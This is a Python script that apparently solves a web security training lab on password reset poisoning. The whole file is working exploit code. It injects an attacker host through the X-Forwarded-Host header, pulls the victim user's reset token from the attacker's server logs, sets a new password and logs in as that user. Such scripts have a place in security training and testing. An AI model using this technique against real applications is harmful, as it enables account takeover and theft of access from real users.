# Password reset poisoning via middleware

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import hashlib

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_token(s, url, attacker):
	print("\n[+] Trying to steal a reset password token for Carlos...")
	reset_path = url + '/forgot-password'
	reset_data = {'username': 'carlos'}
	headers = {'X-Forwarded-Host': attacker}
	log_path = f'https://{attacker}/log'
	r = s.get(reset_path)
	print("[+] Sending a reset password query for Carlos...")
	print("[+] Headers:\t%s" % headers)
	r = s.post(reset_path, data=reset_data, headers=headers)
	print("\n[+] Trying to retrieve the token in exploit server logs...")
	time.sleep(10)
	r = s.get(log_path)
	if 'temp-forgot-password-token' in r.text:
		token = re.findall(r'forgot-password\?temp-forgot-password-token=(.*) HTTP', r.text)[-1]
		print('[+] Found "temp-forgot-password-token" token:\t%s' % token)
		return token
	print("[-] Failed to retrieve the victim's token <!>")
	sys.exit(1)

def connect_as_carlos(s, url):
	print('\n[+] Logging in as Carlos with the new password...')
	login_path = url + '/login'
	login_data = 'username=carlos&password=password123'
	r = s.post(login_path, data=login_data)
	if 'Your username is: carlos' in r.text:
		print('[+] Logged in as Carlos !')
		return r
	print('[-] Failed to log in as Carlos <!>')
	sys.exit(1)

def reset_password(s, url, token):
	print("\n[+] Trying to reset password for Carlos...")
	reset_path = url + '/forgot-password?temp-forgot-password-token=' + token
	r = s.get(reset_path, allow_redirects=False)
	if r.status_code == 200:
		delete_data = {'new-password-1': 'password123', 'temp-forgot-password-token': token, 'new-password-2': 'password123'}
		r = s.post(reset_path, data=delete_data, allow_redirects=False)
		if r.status_code == 302:
			print("[+] Carlos's password reset success !")
			return r
	print('[-] Failed to delete Carlos account <!>')
	sys.exit(1)

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Password reset poisoning via middleware')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		exploit_srv = find_exploit_srv(r)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to reset Carlos password...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			attacker = urllib.parse.urlparse(exploit_srv).netloc
			token = get_token(s, url, attacker)
			time.sleep(2)
			r = reset_password(s, url, token)
			s.cookies.clear()
			time.sleep(2)
			r = connect_as_carlos(s, url)
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
